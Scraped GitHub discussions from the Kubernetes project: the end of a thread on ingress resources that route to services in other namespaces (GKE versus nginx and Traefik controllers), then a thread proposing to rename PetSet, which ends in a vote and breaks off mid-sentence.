level routing of traffic while services do TCP level routing. For your use case I would use a subdomain to route to the dev environment for sure. Usually people don't switch entire namespaces to do deployments, so kubernetes isn't designed towards that model as heavily. However, I can understand why you're doing it, and I definitely think you'll do fine with this approach. You shouldn't see a service interruption by the way if you do it with a script that swaps them around immediately. The nginx config should be updated immediately and nginx doesn't have to restart to apply the change and start rerouting traffic.  @friend I think the main confusion here is due to how Google Container Engine behaves. My first expectation on how Ingress should work was exactly what you described Simply have multiple  resources and the ingress controller will make all of them available on the same node port / IP address to the outside world, right? But then I tested this And this is what I got on Google Container Engine  You can see that there are two public IP addresses now, one for each ingress. So I thought Apparently my mental model on how ingresses are supposed to work is wrong, let's look some more at the documentation  Ah! The documentation suggests to use a single ingress if you want to have a single IP address. All right, seems to work in a single namespace, let's try to add services from other namespaces...  What? Now what am I supposed to do? And that's how I ended up at this issue. I hope that this shows why the model of ingresses that you describe (and which I would prefer) is not what we get by default on GKE. Maybe we are supposed to not use the default ingress controller created by GKE, but that really is not obvious. How can we improve this situation?  @friend you're right, the GCE controller behaves differently than one might expect, and from how I think it's supposed to work, at least from how the developers explain it in this thread. Maybe open another issue? This one is too far gone I think.  @friend, I had the same confusion initially. Container Engine's ""L7"" ingress controller isn't implemented using the familiar model that others have described here. It actually provisions an HTTP/S load balancer per ingress. Besides not being what you want, that could also be costly. fwiw, I highly recommend dumping that ingress controller. I think you can just uninstall it, but a more resilient option could be to annotate your ingress resources in a way that will make that ingress controller ignore them. Then you're free to install some other ingress controller and let it handle things differently than Google's does. I prefer Traefik, personally, so I use the following annotation My understanding is that the Container Engine ingress controller will ignore any ingress annotated with  != . Hope that helps.  I have tried Nginx now and it works fine. I'll also take a look at Traefik. So you and me have figured it out, but others will probably run into it again and again. Google Container Engine is one of the easiest ways to try/use Kubernetes and obviously people try the preinstalled ingress controller first. How can we bring this up with the right people? The Kubernetes project is not directly responsible for GKE, right?  It is. GLBC is written by the same devs in the same repos  I filed  that seems like the right place.  My use case is  jenkins, grafana, etc. in different namespaces I want a single ELB with Ingress per namespace  so the question is, will it work right now? if not, why?  Sorry if this is wrong discussion, just want to describe my case. I have some developer teams working on one complex product. Product is splitted to semi-independent parts, each of particular parts is developed by its own team and namespaced respectively. Everything was great before marketing team demand us to change components addressing from  to . So for now we still have namespaces with own ingresses for every component, but it's absolutely impossible to build ingress resource for ""main"" part, because of structure like this is invalid spec   rules   - host domain.com     http       paths       - component1           namespace component1           serviceName component1           servicePort 80         path /component1       - component2           namespace component2           serviceName component2           servicePort 80         path /component2       - ...  Any chances to use ingress resources in this case, or I need to build homebrewed NGINX configuration to achieve this requirement? Thanks in advance!  @friend what ingress controller are you using? If is the nginx ingress controller then you just need to split de definition of the ingress (to be able to reference services from different namespaces) Like and the controller will merge the paths under the same nginx server  This is what people fail to understand... An ingress controller can read in multiple Ingress objects and build a single config to direct traffic, it's not 1 ingress &lt;-&gt; 1 controller...  With the default GKE ingress controller it is 1 ingress &lt;-&gt; 1 domain or IP addy.  @friend oh, looks like I got it at last! Thank you, will try it in the morning.  @friend I'm still interested Which ingress controller were you using?  @friend NGINX by kubernetes team  Probably out of context, but how does the Nginx controller by kubernetes differ with the one provided by nginx? And which one is preferred and why? I was trying the approach suggested by @friend on nginx plus controller by nginx but it does not seem to work.  For scenario “Bregor commented on Jun 13”, the solution from ""aledbf commented on Jun 13"", not work . Here is example in AWS Per solution, each namespace must generate one ELB (load balance) However, in AWS route 53, one domain www.abc.com can only point to single ELB (load balance). So, you cannot combine all namespace api into one domain www.abc.com You have to divide api into different sub-domain by namespace. namespace1.abc.com namesapce2.abc.com namespace3.abc.com  @friend The issue is about cross-namespace rule definitions in ingress. You seems to have conceptual problem on AWS, even before the traffic goes to k8s cluster. If you choose single domain you are stick to single ELB. If you are using subdomains, you are free to choose - single/multiple ELB. You have to choose. PS. To generate many ELB create multiple kubernetes services (type LoadBalancer) with identical selector pointing to same ingress-controller.  I can confirm that we made work cross namespace on GKE 1.6.4 and traefik. The trick was to use the current (2017-07-13) stable helm. Then, every namespace can have its ingress (referencing its own services) and the main controller aggregates the routes. Just awesome.  This is exactly the same as currently nginx controller works. The issue is to enable in single namespace reference to services in other namespace. Such feature is implemented in voyager ingress controller  apiVersion voyager.appscode.com/v1beta1 kind Ingress metadata   name test-ingress   namespace foo spec   rules   - host foo.bar.com     http       paths       - backend           serviceName s1.bar # serviceName.Namespace           servicePort '80'   When you create an ingress you intentionally think it is build around a loadbalancer or controller. That leads to the thinking that there can be just one. And you would expect to add namespace here If documentation would emphasize that ingress is build around namespaces it would make it obvious that there can and must be many.  I started using GKE, after years of using home grown clusters with the nginx ingress, and was surprised by the IP per Ingress behaviour of the default ingress controller. I thought I could get around this by using a single ingress file in the kube-system namespace that aggregated all host/paths -&gt; service rules but it turns out I cannot reference services in other namespaces. Is there a better option other than dumping the default controller for the nginx controller or manually creating endpoints for a service without selectors?  I think nobody is AGAINST a broader solution, but there are conflict-resolution rules that need to be decided and access control issues to work out.  I'd live to see a proposal. On Fri, Mar 23, 2018 at 806 AM André Cruz notifications@friend.com wrote  My situation is the following Using kops in AWS. I have staging application deployment which lives in default namespace  and production deployment which lives in production namespace. Application consists of two services, one service should be exposed publicly and the other service should be private (i.e. use internal load balancer) There are 2 nginx ingress deployed, one per namespace. Ingress in default namespace is exposed with internal LB and Ingress in production NS is exposed with public LB. I decided that staging services should be exposed via internal load balancer and live in default namespace. When it comes to production main service should use public load balancer and the second service should use internal load balancer. So here comes the problem, that it would be nice that ingress controller in default namespace could access the service(exposed internally) in production namespace... I ended up with the solution  production service that needs to be accessed internally is deployed in default NS alongside with staging deployment. That service is connected to the database that lives in production NS with full DNS name.. I believe that architecture is not perfect and confusing. Being able to access services in different namespaces I could deploy all production services into production NS  my workaround  serviceA in namespaceA create serviceB in namespaceB  add ingress rule into ingressB in namespaceB    I first came across this issue a few months ago and after reading it too quickly I was still confused. After a recent second read I realised that my requirement was actually really easy to achieve with the NGINX Ingress Controller. I've written this up as an article on Medium. I hope someone else finds it useful.  cesartl, Came to same solution by myself, but it is not working. Ingress installed via helm to kube-system namespace with ""rbac create"" option.  hi @friend, I've installed the Ingress Controller manually and it works well. I've actually updated the article above to show how to use Ambassador, perhaps this is a better solution for you?  Hi, @friend  Thanks for awesome job. Anyway, I finally made it, but outside of rancher.  For Google Kubernetes Engine (GKE) specifically, I have written a step by step guide here for setting up nginx ingress controller to route traffic across cross namespace ingress resources  @friend for your post, it was very helpful in getting somethings off ground for me.  Hi @friend , Thanks a lot for your post, it actually helps a lot ! But I'm still stuck on the last step  I tried a sample use-case with a quick nginx deployment as a test web server (yeah using a proxy as a test server is a little weird, ;)), and I'm trying to contact this server using the ""Ambassador"" option. =&gt; when I use kube-ctl port-forward on the nginx pod, I can display the test page without issue. =&gt; when I use the ELB built by ambassador, I get a ""no healthy upstream"" error. In a way, it means that the ambassador annotations are correctly detected and ambassador is trying to do something, but it just doesn't work (I think this error is coming from the envoy proxy, but this is where we reach my limits on the subject ;)) Would you have any idea of the possible root cause / how to debug this ? Ambassador config  exactly a copy-paste of the tutorial, except that  I created everything in the ""ambassador"" namespace I have ""use-proxy-proto"" to ""true"" instead of ""lower"" (I think it was a typo)  Test nginx deployment (note  I deployed nginx in the ""default"" namespace)  Test nginx service Thanks !  Hi @friend, I don't think this issue is the best place to discuss that. You can always discuss with the Ambassador team or their Gitter or the new slack here I'm not an Ambassador expert but I can try to help you there.  What's the argument against referencing a service in another namespace in an ingress? With workarounds like  it would seem whatever supposed security benefits are nonexistent. With the ingress-nginx controller, the ability to inject arbitrary nginx config via nginx.ingress.kubernetes.io/server-snippet means I can essentially emulate cross-namespace service references, but in a janky and error-prone manner. So why not relax this restriction, and let us do what we are already able to do via workarounds, and let us do it cleanly.  The recommendation of @friend to split the ingress from the service worked for us but because we also use cert-manager and an OAuth proxy, having two different ingress objects in two different namespaces caused cert-manager to generate the SSL cert with Let's Encrypt twice.  It would've been better to be able to reference the OAuth proxy in the other namespace to avoid procuring the cert twice.  @friend We have a similar use case where we use an oauth2 proxy and we really don't want to run one in every namespace.  I'm sorry to resurrect a dead thread, but we definitely need this. Our reasoning is this. Let's say we have n number of api's. As n grows we want to create some apis that should be cross cutting in that all teams use them, but managed by one team. It is impossible to manage x number of cross cutting apps in every namespace. So we need to have this cross cutting api in its own namespace for security/managibility reasons. The biggest being since we are now proxying to a new namespace, we can request a new audience for our token, and not bloating the original token. Ingress is by definition a reverse proxy. So it should be easy enough to set  @friend This seems like something that could be better solved by a service mesh like istio?  I tried,but i got error like this ♠Error resolving host ""serviceB.namespaceB.svc.cluster.local"" lookupserviceB.namespaceB.svc.cluster.local on 114.114.114.11453 no such host` It seems like ingress controller using public dns to resolve this hostname. And k8s doc says  ""ExternalNames that resemble IPv4 addresses are not resolved by CoreDNS or ingress-nginx because ExternalName is intended to specify a canonical DNS name. ""  My solution Target using ingress in namespaceB to access serviceA in namespaceA Solution create endpoint in namespaceB point to the clusterIP of serviceA like this  My solution  This solution is not working in GKE. It only allows me to use LoadBalancer or NodePort when I'm trying to reference my service with type as externalName. My workaround was to go a bit lower and fire up an nginx pod in namespace A and point that to my service in namespace B, so I can use my nginx pod's service for the ingress in namespace A.  Worked for me. Thanks  How? GKE does not allow ExternalName and asks for NodePort or LoadBalancer. Any news on that issue? The workarounds do not work for me, since I consider using GCLB (anycast) for multi cluster. Thanks  The ExternalName approach doesn't work on GKE as canmanmake pointed out, here is the error message for people googling this issue. ",134,195,1066,0,0,964,50,
kubernetes/kubernetes/27430,0.027852183000000003,kubernetes,kubernetes,Please consider changing the name of PetSet before release,63701,632,341,0,20,"I brought this up back when PetSet was just a proposal, but it didn't get much response. At the risk of being labeled or dismissed as an ""SJW"" or ""preachy vegan,"" or of stirring up drama, please hear me out The name PetSet is derived from the common metaphor in infrastructure of ""pets vs. cattle."" The metaphor encourages infrastructure developers to think of cloud servers as anonymous and fungible resources rather than things to be manually managed by a person. The implication is that instead of treating a server like a pet, which you take care of and treat when it becomes sick, you simply destroy the server and replace it with a new one, as a cattle rancher would simply kill an animal that didn't serve its economic purpose to the rancher. The pet has a personal and emotional value to you, but the cattle is just a commodity. The lesson in infrastructure here is quite a good one, and its value should be preserved, but using this particular metaphor is quite unfortunate, because it perpetuates the unfortunately common belief that the life and well being of a non-human living thing has value only in relation to its value to humans. This may seem like making a mountain out of a molehill, but try to think about how our language perpetuates our culture and our beliefs. Try to think about it in the context of how future generations will see it. In the same way that homophobic or racist language was (and in some cases still is) commonplace and accepted in days past, in the modern world we generally recognize this language as unacceptable because it promotes a negative world view that we have progressed past. Imagine how angry people would be if this feature were called ""WifeSet"" and the analogy were ""wives vs. bar hook-ups.""  We're in an era of increasing empathy, and that empathy is not bounded only to other humans. It affects any being that can feel pain, sadness, or loss, like we can. While I don't claim to have a perfect substitute for this analogy that might replace PetSet, the one I have been using myself is to compare the role of owning a car vs using a taxi or ridesharing service. When you own a car, it is your personal possession. You take care of it. You keep it fueled, cleaned, and maintained in good shape. When it breaks, you get it fixed. In contrast, a taxi or ridesharing service is using a car as a fungible resource. You hail one only when you need the service it provides, and you use it only as long as you require that service. You don't care which car picks you up, or who is driving it, as long as it is fulfills the service. So my own suggestion for a replacement for PetSet is CarSet. If someone has a better idea that seems to ""click"" with people more, all the better. And of course, the feature could be named something more general—it doesn't have to use an analogy. (I recall that originally ""NominalSet"" was being considered.) This issue is not about me or anyone else being ""offended,"" or requesting that the name be changed to CarSet specifically—it's just asking specifically not to invoke the pets vs. cattle metaphor in the name of this feature. Thank you very much for considering this. For context, here is my previous comment from back in the proposal phase.  Thanks for speaking up - we will definitely take this into the discussions in the community before this feature moves out of alpha.  Agree.  We went with PetSet as a working name in part because we knew it could never be the ""real"" name, but we didn't have a good name for the concept yet.  Names hold power, so we want to be careful to find something thta captures the problem well.  Having a first impl of the solution will help refine the problem statement, too.  @friend I kinda like it ... and it may be a bit too late.  Lots of press about Pet Set already.  Yeah, I may have misunderstood what was meant by changing it before coming out of alpha. To some extent I think the damage is already done now.  Blame me 👍   One good thing ... memorable names stick.  Can we close this?  I'd still like the team to consider changing it.  I think we really should consider changing it.  Silly names do stick, but they are silly. On Fri, Jul 8, 2016 at 332 PM, Jimmy Cuadra notifications@friend.com wrote  @friend we have videos on YouTube, blog posts, tweet, LinkedIn stuff and presentations at conferences, and many many decks with that content. You want to do the rebranding???  It is a big problem to change at this point...  Let's just leave it on the table.  I suspect neither of us have marketing degrees ) On Fri, Jul 8, 2016 at 355 PM, Chris Love notifications@friend.com wrote  I'm 100% ok with renaming, and don't feel like there's any pain in doing so. However, CarSet does not feel like a fit. For any who would like name change, please voice here. We'll bring this up at the community meeting next week, and I'd like to settle on a new name by August 1.  Re-quoting myself for emphasis If the name were something that was seen more universally as unacceptable, I don't think ""people already started using the term in social media, oh well, let's keep it"" would be an acceptable attitude. The fact that it's already out there doesn't mean there's no value in changing it. If having a reference to something out in the wild meant you couldn't change it in the future, we wouldn't have things like changelogs and semantic versioning.  CarSet does not have any relevance in tech, can we come up with something techy or ship like? I am sorta on the side of not changing it, but we need a good name.  If we do change it we gotta change it quite quickly. People will have PetSet in production very quickly if not now.  Changing code because a team chooses to change branding probably will not make people happy.  Let's be sure to separate this out into two discussions - deciding on a change, vs the naming process.  We already have a pattern to deal with the later, but getting the general agreement in the community that the name should be changed probably is what we want to stay focused on for now. On Fri, Jul 8, 2016 at 734 PM, Chris Love notifications@friend.com wrote  @friend I'm not bound to CarSet (though PetSet doesn't have any ""relevance in tech"" either)—I was just offering a suggestion that used a similar metaphor, so as not to simply ask the team to do something without offering a possible way to do it. People who have worked on the feature or been involved in its design discussions will probably have better ideas, since they have the best understanding of the use cases for the feature.  Just stumbled on this thread...adding my $0.02.  Naming IS HARD!!! I've named dozens of products, features and even companies and its never been a quick or simple process. Everyone has an opinion. 100% certain there will be someone that does't like a name. Getting everyone to agree on a name shouldn't be a requirement Very hard to re-name something once it has any kind of name recognition.   As for PetSets in particular, I think it's a pretty good name. Both informative and evocative (IMO in a good way), which are two of the most important aspects of a name. That said, its really the name of one of several similar kind of features. And within this broader context it lacks the consistency you'd expect across similar things. Don't have any of the history, but I thought Replication Controllers were renamed to Replica Sets to introduce the idea of Sets which could then be applied to different kinds of sets (i.e. PetSets). But as a group, these two names seem random and they miss the opportunity to apply further consistency across Sets (i.e. one name is literal, the other analogous). Also, will there be other kinds of Sets? If not, then random is probably OK. But if there will be more kinds of Sets, then the next one would also have to be random since you definitely shouldn't have two 'literal' names with another that is 'analogous'. That would just make PetSets seem too casual and not serious.  FamilialSet would get the same idea across.  Each member of a family is special, cares about its peers, and often has a particular role, and everyone mourns the loss of any one member. Or something similar like KinSet or KindredSet On Friday, July 8, 2016, chrismarino notifications@friend.com wrote  JetSet seems fitting (and one letter off). Besides relating the term ""jet set"", a JetSet is composed of Jets, which should be handled with care  The name petset is derived from the fact that I care about my pets, regardless of what anyone else thinks about their cattle. Cattle are sacred in some places, food in others, and I view that as a culture difference.  I won't use pets vs cattle to explain this feature where I'm from, but pets vs servers works just as well )  @friend That's a fair point. Pets have value whether or not they are compared to something else. But the usage of the term in Kubernetes is not without context Pets vs cattle is a metaphor very commonly used in writing about modern infrastructure. A quick Google search even brings up usage of the term in Kubernetes's own blog. It seems to sidestep the issue I'm trying to address to suggest that the term has no prior meaning in this area of our industry. There are an infinite number of things this feature could be called. Surely there is something that would work that doesn't use this metaphor.  We can publish options for discussion here. Instead of using metaphors, which can have unintended meaning, let's try a descriptive name. Should ideally be easy to understand for someone with a Linux background. Throwing out some options.  PersistentSet StatefulSet or StateSet PermanentSet StickySet BindSet NamedSet SavedSet StoredSet SequentialSet OrderedSet   I think that's a good initial set of names (pun intended). I don't think we're too late to change it, as others have pointed out. Yes, there are videos and other materials out there, but it will only get worse with time. If the community agrees that this is a worthwhile thing to do, it should act quickly, otherwise we end up with fuzzy transitions like the one from Replication Controllers to Deployments and Replica Sets. If we can come up with and agree on API method and parameter names we can certainly converge on object names like these. I find several of the ones proposed by @friend to be simple and self-explanatory. I personally think the first two work well PersistentSet or StatefulSet, as opposed to EphemeralSet.  My $0.02 vote from Aparna's excellent list  NamedSet PersistentSet  On the crazy idea side  Snowflake Set Borg Set (like ""I am 7 of 9"")  I was never fond of PetSet - only for the reason that it is not obvious what it is on its face, and breaks with the obvious naming we have across the product. A ""ReplicaSet"" is, plainly, a set of replicas. A ""Deployment"" is ... well ... a deployment. Etc. The word I'm looking for here is ""what is the opposite of a bunch of exact replicas, each of which are unique in some way, but still have some similarity as a group."" Maybe I'm coming around to Family/FamilialSet. Or ClusterSet?  Aparna's list is great. My favorite of the bunch is StatefulSet, since the term ""stateful application"" is used in the container world and should be pretty easily understood. In discussion of container orchestration systems, you'll often hear people ask, ""Great, but how does it handle stateful apps?"" In a similar way to how the other ThingSets are sets of Things, a StatefulSet is a set of stateful pods/apps. It could even be more explicit StatefulPodSet.  FamilySet probably fails the ""is a recognizable term for describing the concept at play"", and is also redundant (a family is another way of saying ""set of humans with shared responsibilities for raising biological offspring"", so ""a set set""). The distinguishing characteristics of the use case for this object is  To preserve individual identity for fungible entities To provide predictable ordering and control as those entities change To enable the software entities to identify and recognize the other entities by those identities To get access to a consistent storage mechanism (because their identity also corresponds to data)  Sequence and ordering are relevant, but not strictly necessary (in the future we will probably introduce other naming and ordering schemes, which may prevent sequential / ordered from being accurate).  State (or at least, storage) is not required, although I agree that in practice most of the use of this set would be for stateful services. On Sat, Jul 9, 2016 at 413 PM, Jimmy Cuadra notifications@friend.com wrote  It's hard to pick a name that doesn't extol any single feature of petset (such as state, persistence, ordering, ordinality, name, sequence). This is one feature we built in reverse, by prototyping a bunch of applications that didn't fit in any existing bucket and formalizing their requirements into an api. This process is sometimes called domain modelling, and the number of things required by this domain is &gt; 1 word. We faced a similar dilemma choosing its api-group. I think ""is a recognizable term for describing the concept at play"" might be a trap, and we just need to call it a word that makes people think of the domain.  Aparna's list is awesome! My $0.02 vote is  PersistentSet NamedSet OrderedSet  We should consider primary use-cases of PetSet to choose name  Here are a few more options  DistinctSet UniqueSet SuiSet (stateful uniquely identifiable; also a play on sui generis) PetSet, redefined as an abbreviation/backronym of PersistentSet (""Pe't"")   I like this @friend  So the features of Pet Set are based on identity and don't have to include Data existence.  I can have a stateless Pet Set of an application that required known identity for quorum.  I would ask to stay away from names that include references to other components like Persistent Volumes when you don't need a PV for a Pet Set. But back to @friend's point, should we focus on if we want to change the name to what the name should be on this issue?  @friend you mentioned that we have a procedure for naming stuff?  I had suggested splitting so that we'd have a discussion about the bits independently, but I think it's fine to continue proposing ideas here. Generally this would go through the proposal process - we'd identify a list of names, people would register objections to the names, and then given the list of candidates try and remove outcomes that don't measure up based on the objections.  Once we've gone through that round, assuming we have a number of candidates that people feel strongly about, we'd try to refine them with general agreement amongst the API and proposal reviewers (with the API reviewers being final deciders). I'd probably argue that getting this name right is extremely important - important enough that we want to find a name that is good enough that all disagreement is resolved through strong arguments for why a name is best  It succinctly describes the core goal It is recognizable to a layman in the ""systems administration"" or ""web software"" fields as matching that core goal, and it would be best if explaining it can be done by simple analogy to something those users are already familiar with It ends with *Set We prefer descriptive names over ""cute"" names inasmuch as we're trying to describe a core pattern vs creating marketing material, keeping in mind patterns that can't be explained easily aren't good patterns.  I think most of those have already been stated here, and if folks want to continue brainstorming here please do so. On Mon, Jul 11, 2016 at 151 PM, Chris Love notifications@friend.com wrote  From the latest blog post  wat. I think this is a pretty good example of how ""pet"" isn't the right name for this even technically since a pet has a number of extra implications. ♠NamedSetIdentitySetPersistentSetPersistentSetNamedSet + (n * PersistentVolumeClaim)`. Also relevant re the blog post. This really needs to happen sooner rather than later or it's guaranteed to stick or at least be too complicated to change due to docs/issues/code that already references the current name.  For completeness, names that have been proposed in the past that I don't see above include NominalSet, ShardSet, and IndexedSet. The distinguishing characteristics we want to convey were specified here  expand on the storage point The controller currently known as PetSet is unique among all the controllers in that it can instantiate and manage PVCs as well as pods, and, though it has other uses, the driving motivation for this controller is improved support for stateful workloads. ref #260, #18016, #3024  Another blog post has appeared which quite heavily uses the pets vs. cattle metaphor and makes it very clear that this is the derivation of the name of PetSet. Is there a way to communicate to the Kubernetes marketing team that a rename is being discussed? This kind of attention on the name PetSet is why I emphasized ""before release"" in the title of this issue. Thanks to everyone participating in the discussion to help find a more fitting name.  Sets are unordered.  Lists, Arrays and Sequence all imply order and having indexes.  So, I don't get why it has to end in set.  I don't even think it is good for it to end in set. Which opens up  PodArray PodList PodSequence PetArray  uuh, no... wait, that last one doesn't work smirk     They aren't replicas, but they aren't totally different either.  There is only one template.  They all have to have the same PodSpec.  So, ""distinct"" or snowflake overemphasize the differences.  It would be nice to capture that they are similar, and cooperate to fulfill a single purpose (what we would call a service if that name wasn't taken).  But they have numbers. Which leads me to the name ""Team"".  They work together, but they have numbers on the back of their jerseys so that you can tell them apart.  Another thought While the dictionary definition of ""Replica"" is an identical copy.  But that is not how we use it in computer systems.  MySQL, which is a key motivating use case for PetSet, talks about the master and slave (yes, I know another offensive term), as both being replicas.  In fact, zookeeper and cassandra talk about replication and replication factors -- which I understand refers to specific data being replicated rather than instances, but all these apps that we are talking about running with PetSet, there is replication involved. So, what about  ReplicaList ReplicaVector ReplicaSequence ReplicaArray  I sort of like ReplicaArray best because array index is a thing, but list index, vector index, and sequence index are not so much things. I also like that it suggests some similarity with ReplicaSet. Also, the PetSet type has a  field in it, so, yeah.  Team, Lineup, Ensemble, Cohort or Variants. I agree with @friend that the name needs to convey some degree of similarity rather than uniqueness.  Can someone change the name of this issue?  Release has already occurred ;) StatefulSet gets my vote. Or on the radical side PetSet ... just keep the darn name.  plus one to StatefulSet  In my mind, the general use case that stands above the rest is that by contrast to all other pod deployment mechanisms this is the one that allows stateful pods. So my vote is for  - it is after all a set of states (thanks @friend for a great list); it sounds the best to me and is grammatically akin to ,  and ; but I would side with  as a next best option. Terms that start with ""Replica"" will be confusing next to . And names that make the indexing prominent don't describe why you would want to use pods that are indexed.  is a good suggestion, but ""Teamwork"" could also describe what ReplicaSets do.  plus one for StatefulSet, @friend when reading your comment i was already confused by this, thinking it was already changed to ReplicaSet. Please do not pick a name that is too similar as it would be very easy to confuse the two (ReplicationController vs ReplicaSet vs ReplicaSequence ??? Very confusing to a beginner).  plus one to ShardSet. A shard of a distributed database has a stable identity and associated persistent storage. Shards may added/removed from the system, but it is a non-trivial operation that requires careful planning and execution. This is the gist of a PetSet as I understand it. Also the terms ""shard"" / ""sharding"" are already familiar the intended users of this feature, which is IMO an advantage over more abstract names like OrderedSet, ReplicaVector.  I think ShardSet is a little too narrow because sharding is a subset of what PetSets do. PetSets allow the stateful representation of shards. PetSets are also for the stateful management of unsharded data like SQL master/slave replicas or etcd clusters where data is replicated but not sharded. As best as I can tell the commonality is statefulness.  Agreed, but does ""StatefulSet"" make sense? Are the things in the set stateful, or the set itself? I think most people would assume the latter. ShardSet does not have this ambiguity. ""Replica"" has already been established as the identical, interchangeable kind in Kubernetes lingo, so I think using a different word is warranted for the replicas that have distinguishable identity.  I would say - keep PetSet and focus on something more important. There are already Masters/Slaves and BlackLists/WhiteLists and we live with it )  plus one for PetSet ShardSet or StatefulSet are not better than what we have now. On Tue, Jul 26, 2016 at 554 PM, wallverb notifications@friend.com wrote  I suspect the naming problem is actually a symptom of a design/hierarchy/abstraction problem from trying to add mid-layer functionality without breaking reverse compatibility of the existing layers. AFAIK, the distinguishing capability of PetSet is that it persists the IP and volumes of a container through resurrection/rescheduling of the container. This implies there may be a missing abstraction layer between replicator and container. For example, ignoring existing nomenclature, you could describe Clans as sets of Households that contain People, where the Clan describes a quantity of Households, the Household describes a named set of People, and the People can be either parents or children (expressing a two-level hierarchy of containers like a pod, where the parent namespaces network/disk/volumes for the children to share). The names that the Household uses to describe the People could then be configurable to either survive reincarnation (like PetSets) or not. If reincarnation is enabled, a replacement Person would get the same name/network/volumes as its predecessor. These names are probably not ideal either, but they hopefully they express how ReplicaSet and PetSet could exist in the same object hierarchy.  The goals of an rc and petset are different. an rc is like a batallion of soldiers, they don't really know each other and as some die they're replaced asap. A petset is more like a family, they get names and startup/die in order. Obviously the soldiers can form a familiy, it would just be awkward, and the family can form an army, it would just be ineffective. The difference between an rc with reincarnation set to true and a petset is the latter provides an ordinal index, startup/teardown and a few other features designed to safeguard cluster membership.  Those could be accounted for with feature flags, rather than being implicit features of the abstraction layer. Ordinal index is similar enough to a persistent name. Startup/teardown is something that would be nice to have on all containers/pods.  I'm in love with this thread, as an example of the beauty of the open source process. @friend thank you for bravely (re)raising this issue. I agree 100%. I don't have much background in sociology to know fully the implications, but it seems worth every effort to try to reduce use of violent language, even when its impact would be subtle. A name change is insubstantial; people will get used to it. In fact, people may wonder why it was renamed and find this thread and make their first contact with the concept of the impact of language on animal welfare. =) plus one for StatefulSet.  On naming This is not a Set. The members are ordered and indexed. I agree with @friend that it's an Array. So, . Deployment, Job, and DaemonSet are named according to use case, not according to mechanism. Therefore, names like NamedArray or IdentityArray are less than ideal. It's useful to be able to refer to the pods as instances of the group; for example, pods of DaemonSet are daemons, pods of ReplicaSet are replicas, and pods of Jobs are tasks. Pods of any collection with a name of the form AdjectiveArray would probably be called Adjective instances; for example, Stateful instances of a StatefulArray. To propose other alternatives for consideration (though I'm not in love with them) An individual is a distinct member of a group, potentially with some special quality. So, IndividualArray. It's a bit long, but still shorter than ReplicationController. Its pods would be individuals. InstanceArray could also work, would be shorter, and would be consistent with (though perhaps confused with) GCE Instance Groups.  As Brian mentioned, a key differentiator on PetSet is that it is composed of unique-ish individuals working in concert with one another. Some alternatives to consider  Cohort (Pods = Individuals) This is short and a way of referring to a group of individuals working together   Concert (Pods = Individuals) Also short   CollaboratorArray (Pods = Collaborators) Also clearly defines the individual items as working together instead of independently   AssociatedArray (Pods = Associates) AssociateArray (Pods = Associates) PartnerArray (Pods = Partners)   @friend @friend @friend You all interested in weighing in on the language aspects of naming?  One other thought, I don't love the PetSet name for a completely different reason, which is that it implies these things are going to be a lot of work to maintain.  I'd rather have a name that indicates how they are managed differently than Deployments, but not that they are fundamentally require a lot of care and maintenance.  (though in some cases they might this isn't inherent to how we manage them)  @friend The name should ideally clearly distinguish the purpose from ReplicaSet.  OrdinalSet individuals could be called Ordinals; carries forward the set-suffix that some people like; emphasizes that the individuals have numbers.  On ordinal  My vote for criteria we should use, extracted from  above Thus, plus one to StatefulSet or StatefulArray, even if you could technically use it for non-stateful things too. Re Set vs. Array, everything else is a Set, so I think departing from that convention adds more friction and thus cost than the benefits we'd gain from a more technically-precise name.  Again, see criteria above -- who are you optimizing for?  Ok, since we are using the indices for sequencing, ordinal is more accurate than it was originally, and is less ambiguous than nominal. It is, however, less suggestive of the use case than Stateful or Persistent. However, while the primary use case is stateful applications, it's not the only use case. Similar to indexed jobs, the index could be used to distribute soft state  not ordinal, other terms that convey similar meaning that have been discussed are  a sequence is an enumerated collection of objects an array is an ordered arrangement  I think ""sequence"" is too strongly suggestive of ""sequential"". Lots of other naming considerations were discussed in #3024.  On Set vs Array, another option is to drop those suffixes completely, along the lines of Deployment and Job.  The basic difference between ReplicaSet and PetSet is that PetSet's members are denominated somehow, while ReplicaSet's are anonymous, right? ""Denominated"" is a mouthful, but other (shorter) synonyms for ""named"" might be appropriate. Re Set vs. Array I've seen ""collection"" used to good effect to describe a grouping of related things in no particular order (such as set) and that aren't guaranteed to be contiguous (like array). Just thoughts. On Oct 18, 2016 610 PM, ""Brian Grant"" notifications@friend.com wrote  Thanks, @friend. In this case, the members are ordered (sequential startup) and contiguous.  I agree with @friend about the main purpose. The API group is apps. We could use  or even just  (/apps/.../statefuls/).  @friend - I have a concern with .  We will be answering tons of questions that say, ""No, you do not have to use a StatefulApp if you want to have a persistent volume attached to your application."". Much of the PM/user feedback we have got from the Red Hat side of the house is that ""State"" is a term that is too overloaded for this context.  We have had some users request ""MultiplexSet"" since it describes ""consisting of many elements in a complex relationship.""  plus one to @friend 's comment above about anything of the form Stateful* I think it's actually worse to be overly-specific than to be not-obvious-until-someone-explains-the-connection.  @friend @friend I disagree. An obscure name won't help us. The name can help steer new users in the right direction, which can be hard to do with documentation alone. OTOH, we can explicitly state in all the relevant docs that all controllers and pods support PVCs/PVs, and the tradeoffs of using those other mechanisms (lack of fencing, lack of generating claims from a template, lack of multi-writer support on most block devices, etc.). Anyway, we're going to have a vote this afternoon.  fyi, this email was just sent out to the kubernetes-dev mailing list regarding the vote. Dear Kubernetes Community, In version 1.3, we alpha released a feature called “PetSets” which enables stateful application support in Kubernetes.  After careful consideration and discussion with community members, we have decided to change the name of this feature “PetSets” (background  would like to have community members vote on a new name for PetSets.  Suggestions were received from community members and below is our final list of candidates.  Please note that we are not accepting any new names at this time and the community has decided that “PetSets” should not be one of the options.  The candidates for the new name are the following StatefulSet StatefulArray Stateful StatefulApp PersistentInstanceSet PersistentInstanceArray We have set up a ranked-choice voting poll below where you can rank the names in the order that you like here link The voting will be open until the end of day Monday 10/24/2016 midnight pacific time.  Please vote only one time. Please email me if you have any questions or concerns.  Thank you! Dan Paik danpaik@friend.com Kubernetes Product Manager  The names you've listed don't seem to correspond to any of the better suggestions that have been generated in the past.  Can you describe how you picked these names out of the suggestions above?  We started by listing pretty much all of the suggestions that came in through this thread and then discussed each one on whether it was confusing with other features or technology (e.g. ReplicaSet, ShardSet) or sounded odd (IndividualSet), had potential for controversy, etc. and eliminated as we went down the list over a few rounds of discussion.  We also wanted to end up with a manageable list (&lt;10 options).  Many of the people on this thread were involved.  It would have been good to do that slightly more transparently.  I was surprised by this, and I wasn't aware this was coming up. On Wed, Oct 19, 2016 at 346 PM, Dan Paik notifications@friend.com wrote  what's the proposed timeframe for the rename? pre-1.5? can we drop the 